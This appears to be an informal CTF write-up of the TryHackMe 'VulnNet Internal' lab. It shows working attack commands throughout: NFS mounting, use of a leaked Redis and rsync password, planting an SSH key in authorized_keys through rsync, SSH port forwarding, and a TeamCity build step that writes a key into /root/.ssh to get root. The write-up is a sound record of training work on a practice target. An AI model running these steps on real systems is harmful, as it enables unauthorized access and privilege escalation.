#writeups

```
22/tcp   open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp  open     rpcbind     syn-ack     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40311/tcp6  mountd
|   100005  1,2,3      47474/udp6  mountd
|   100005  1,2,3      52736/udp   mountd
|   100005  1,2,3      60987/tcp   mountd
|   100021  1,3,4      32863/tcp6  nlockmgr
|   100021  1,3,4      46819/tcp   nlockmgr
|   100021  1,3,4      47896/udp   nlockmgr
|   100021  1,3,4      60376/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn syn-ack     Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       syn-ack     (protocol version 31)
2049/tcp open     nfs_acl     syn-ack     3 (RPC #100227)
9090/tcp filtered zeus-admin  no-response
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m52s, deviation: 34m37s, median: 6s
| smb2-time: 
|   date: 2023-03-19T09:11:17
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39670/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46910/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46662/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51333/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2023-03-19T10:11:17+01:00
```


```
//10.10.85.179/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                       
//10.10.85.179/shares   Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                          
                                                                                                                        
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                              
//10.10.85.179/IPC$     Mapping: N/A Listing: N/A Writing: N/A
```

let's check the share dir, I found some interesting file, and a flag, the first, but
after that I see the ports, and I found a rare port, the NFS one, so I did a search on 
google and I got a module from metapsloit, a scanner and after I found

`[+] 10.10.85.179:111      - 10.10.85.179 Mountable NFS Export: /opt/conf [*]` or make `showmount -e <ipRemote>`
so let's mount it, `sudo mount -t nfs 10.10.85.179:/opt/conf ./mounted -o nolock`, here the command, then 


hint:"It's stored inside a database of one of the services.", and one that I found and the mounted
called redis, it like a data storage, and here the password I found into the *redis.conf*
```
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"
```
and right let's connect to this instance 
```
# Require clients to issue AUTH <PASSWORD> before processing any other
# commands.  This might be useful in environments in which you do not trust
# others with access to the host running redis-server.
```
with `redis-cli -h <ip>` equal `sudo redis-cli -h 10.10.85.179` then I used the password
to authentificate, yes then 
```
- SELECT 0
- KEYS *
- GET "internal flag"
```

marketlist 
```
"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
equal
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
it means now we'll be able to connect in the rpc because we have some creds, so to scan the rsync, we can make
a nmap to see the port are 873, and see if there are any files in this server, I did it with "rsync-list-modules" from
nmap NSE, and also with metasploit. after I used this command 
`rsync -av rsync://rsync-connect@<ip>/files ./dirTocopy`, to copy the files the rsynxc server had, and by exploring
these files I found the "user.txt", then I see a .ssh dir, that mean we can have some remote shell just to access 
with the sys-internal machine, why not, so I'll generate an authorized_keys to upload it via rsync and by doing that the server
will accept my ip to connect to the ssh, I generate a key and copied to authorized_keys(I created this one in the `sys-internal/.ssh`
),
`rsync -av ~/myFiles/writeups/tryhackme/vulnetInternal/vulnetInternal.pub rsync://rsync-connect@10.10.172.87/files/sys-internal/.ssh/authorized_keys`,

so now let's connect the ssh, sys-internal the username, and the generatekey will help us like a password, and here we go
we got the ssh. 

exploring the /, I found a uncommon dir, TeamCity and let's look if this service are running and what right he has,
he is running, and with root right

```
root       536  0.0  0.0   4628   804 ?        S    09:51   0:00 sh teamcity-server.sh _start_internal
```
and by looking that I set my mind to prepare by doing ssh pivoting
```
`http://localhost:8111/` (Linux, macOS)
```
so the service are running on a port and to finish we have to access within, and I also see
```
tcp   LISTEN      0        100                               [::ffff:127.0.0.1]:8111                                                         *:*                
tcp   ESTAB       0        0                                 [::ffff:127.0.0.1]:51061                                       [::ffff:127.0.0.1]:8111             
tcp   CLOSE-WAIT  1        0                                 [::ffff:127.0.0.1]:60089                                       [::ffff:127.0.0.1]:8111             
tcp   ESTAB       0        0                                 [::ffff:127.0.0.1]:8111                                        [::ffff:127.0.0.1]:51061
```
so that confirmed the service are running, and here the port forward
`ssh -i vulnetInternal sys-internal@10.10.172.87 -N -L 127.0.0.1:9999:127.0.0.1:8111` then after I opened my browser
and get the 127.0.0.1 and I had this message in the login 

```
No System Administrator found. 
Log in as a Super user to create an administrator account.
```
and when I was lloking in the log I found

```
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 9163454937103602972 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 9163454937103602972 (use empty username with the token as the password to access the server)

```
the last one was the good one(notice the token change each time the machine restart), after that I created a project, and a buildsteo,
in the build I make
```
mkdir -p /root/.ssh/
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+/ri0AgLewKXw/ZbHVhqYo6UP/11K9dv+spiM+MqRCnpk1xXsk3fvimdhXOKChjD3W1vcbzZwoB9f+ea2f314xwEtzpIC1jXasj/m9T13hI0tFx+weFAqQgsSgHwmDUvPMvkd6ovTTGMf8v4prWh3A32Ofu3keZoPgJUJ+/Bn2y5VYwNcK7k3VjnaxW8Y8PrCImDED6re/r8TwXlfBHTEE4iHZz1danXaDUwvS6x/8Qx28kp9r11nS54oWoDBI0y/eLFFV7Vrr09j49B1TY7xtqrB/wz6yJ5QVEgjDbFcp9c+7kSG4XAr/oAXUMfLxRr+quJaVjh80AKItLS6MKqyDNjEfzbBSe4GDb3K4kIWjD9DPgUyCN1Afm7jjlQhXdiDiRFEMX8bpnwKtBZAQI0p9bg4de4ieZTxpN1wgUk1bK9hnbNzBozBk6O/Slxx1Jf1gXTu8zcAaNmYZsNNsioF/9mPPua0P2/HoiQhZzub3orMD44OFytgiMkPXMBhzDE= kali@kali' > /root/.ssh/authorized_keys
```
and launch it, after a while I connect with ssh again, but this time with root user and got the last flag



disc
https://blog.raw.pm/en/TryHackMe-VulnNet-Internal-write-up/
https://r4bb1t.medium.com/vulnnet-internal-write-up-69a1d3c979e7

